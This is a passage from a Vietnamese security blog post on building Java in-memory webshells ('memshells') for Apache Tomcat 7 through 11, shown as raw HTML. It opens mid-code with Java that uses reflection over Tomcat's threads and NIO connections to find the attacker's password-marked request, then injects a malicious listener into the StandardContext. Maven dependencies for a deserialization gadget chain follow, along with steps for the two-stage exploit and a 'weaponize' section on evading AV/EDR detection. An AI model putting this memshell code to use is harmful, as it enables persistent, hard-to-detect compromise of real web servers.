</span></span><span style="display:flex;"><span>            request <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletRequest<span style="color:#f92672">&gt;)</span> requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            ServletResponse tmpResponse <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletResponse<span style="color:#f92672">&gt;)</span> responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>ServletResponse<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>tmpResponse<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;response&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// ResponseFacade (fix tomcat 9)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// tomcat 10, 11
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            Thread<span style="color:#f92672">[]</span> threads <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Thread<span style="color:#f92672">[])</span> getFieldValueByObj<span style="color:#f92672">(</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">currentThread</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getThreadGroup</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;threads&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Thread t <span style="color:#f92672">:</span> threads<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                Runnable target <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    target <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Runnable<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>t<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;target&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception pass<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>                Class pollerCls <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.NioEndpoint$Poller&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>target <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> target<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>pollerCls<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Set<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> nio <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Set<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;)</span> invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.AbstractEndpoint&#34;</span><span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>                            getFieldValueByObj<span style="color:#f92672">(</span>target<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;this$0&#34;</span><span style="color:#f92672">),</span> <span style="color:#e6db74">&#34;getConnections&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// this$0 ~ outer class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#75715e">// current open connections, we need to get exact one we make
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Object n<span style="color:#f92672">:</span> nio<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        Object req <span style="color:#f92672">=</span> getFieldValueByObj<span style="color:#f92672">(</span>getFieldValueByObj<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>                                invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.tomcat.util.net.SocketWrapperBase&#34;</span><span style="color:#f92672">,</span> n<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getSocket&#34;</span><span style="color:#f92672">),</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">&#34;appReadBufHandler&#34;</span><span style="color:#f92672">),</span> <span style="color:#e6db74">&#34;request&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                        Request tmpReq <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Request<span style="color:#f92672">)</span> invokeMethodByClsName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.coyote.Request&#34;</span><span style="color:#f92672">,</span> req<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getNote&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>tmpReq<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                            request <span style="color:#f92672">=</span> tmpReq<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                            response <span style="color:#f92672">=</span> tmpReq<span style="color:#f92672">.</span><span style="color:#a6e22e">getResponse</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#ae81ff">12311231</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        StandardContext stdCtx <span style="color:#f92672">=</span> getStdCtx<span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        stdCtx<span style="color:#f92672">.</span><span style="color:#a6e22e">addApplicationEventListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ListenerTemplatesImpl<span style="color:#f92672">(</span>response<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;inject success!&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>add dependencies:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>javax.servlet<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>javax.servlet-api<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>4.0.0<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--&lt;scope&gt;provided&lt;/scope&gt;--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.tomcat<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>tomcat-catalina<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>8.5.55<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;scope&gt;</span>provided<span style="color:#f92672">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>commons-beanutils<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>commons-beanutils<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>1.9.3<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>javassist<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>javassist<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>3.11.0.GA<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>Cần exploit deser hai lần (đối với tomcat 7-9), lần một để sửa thuộc tính, lần hai để inject memshell:
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/inject_success.png" alt="inject_success">
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/ipconfig.png" alt="ipconfig"></p>
<h2 id="weaponize">weaponize</h2>
<p>Memshell giúp webshell hạn chế bị detect và loại bỏ hơn, tuy nhiên dù là shell gì thì khi spawn process bash/cmd mới, các AV/EDR ngày nay vẫn có khả năng phát hiện, do đó, nếu memshell chỉ chạy trong tiến trình JVM hiện có, gọi các method bình thường thì rất khó để phát hiện.</p>
<p>Trừ khi phải leo quyền để post exploit và pivoting trong mạng internal, việc chạy command là không cần thiết. Các tác vụ như tunneling, file browsing, upload/download file thiết yếu có thể dễ dàng thực hiện trong code java và nhúng vào memshell. Ở bài viết này mình sẽ chưa đề cập, người đọc có thể tự tìm hiểu thêm.</p>
<h2 id="after-word">after word</h2>
<p>Well, not easy as it look :(, công test khá tốn sức, các bài viết sau có thể về inject memshell qua java agent, các cơ chế defense/bypass defense, custom shell (có thể :))</p>
<h2 id="refs">refs</h2>
<ul>
<li>different way to obtain StandardContext: <a href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></li>
</ul>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/notes">Notes</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">preface</a></li>
    <li><a href="#jsp-type">JSP type</a>
      <ul>
        <li><a href="#fix-compatibility-issues-with-tomcat--9090">fix compatibility issues with tomcat &gt; 9.0.90</a></li>
        <li><a href="#self-deletion">self-deletion</a></li>
      </ul>
    </li>
    <li><a href="#vulnerabilities-type">vulnerabilities type</a>
      <ul>
        <li><a href="#obtain-requestresponse-object---tomcat-echo-7-9">obtain request/response object - Tomcat echo 7-9</a></li>
        <li><a href="#fix-compatibility-issues-with-tomcat-10-11">fix compatibility issues with tomcat 10, 11</a></li>
        <li><a href="#merge-poc-obtain-standardcontext-and-inject-memshell">merge PoC, obtain StandardContext and inject memshell</a></li>
        <li><a href="#inject-memshell-via-deser-gadget-chain">inject memshell via deser gadget chain</a></li>
      </ul>
    </li>
    <li><a href="#weaponize">weaponize</a></li>
    <li><a href="#after-word">after word</a></li>
    <li><a href="#refs">refs</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&text=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&is_video=false&description=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&name=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems&description=The%20knowledge%20is%20endless%2c%20don%26rsquo%3bt%20just%20learn%20it%2c%20do%20it%0apreface%20Tr%c6%b0%e1%bb%9bc%20%c4%91%c3%a2y%20m%c3%acnh%20%c4%91%c3%a3%20vi%e1%ba%bft%20m%e1%bb%99t%20b%c3%a0i%20kh%c3%a1%20basic%20v%e1%bb%81%203%20lo%e1%ba%a1i%20memshell%20tr%c3%aan%20tomcat%2c%20%c4%91%c3%a2y%20v%e1%ba%abn%20ch%c6%b0a%20ph%e1%ba%a3i%20t%e1%ba%a5t%20c%e1%ba%a3%20c%c3%a1c%20th%c3%a0nh%20ph%e1%ba%a7n%20c%c3%b3%20th%e1%bb%83%20l%e1%bb%a3i%20d%e1%bb%a5ng%2c%20c%c3%b2n%20c%c3%a1c%20lo%e1%ba%a1i%20kh%c3%a1c%20nh%c6%b0%20Valve%2c%20Executor%2c%20Poller%2c%20Http11NioProtocol%2c%26hellip%3b%20%28ch%c6%b0a%20k%e1%bb%83%20framework%20nh%c6%b0%20spring%20hay%20c%c3%a1c%20webserver%20servlet%20kh%c3%a1c%29%20nh%c6%b0ng%20%c4%91%e1%bb%83%20ph%c3%a2n%20lo%e1%ba%a1i%20theo%20c%c3%a1c%20c%c3%a1ch%20inject%20v%c3%a0o%20memory%20t%e1%bb%ab%20exec%20code%2c%20ta%20c%c3%b3%20ba%20lo%e1%ba%a1i%3a" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&t=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2025  devme4f&#39;s blog 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/notes">Notes</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
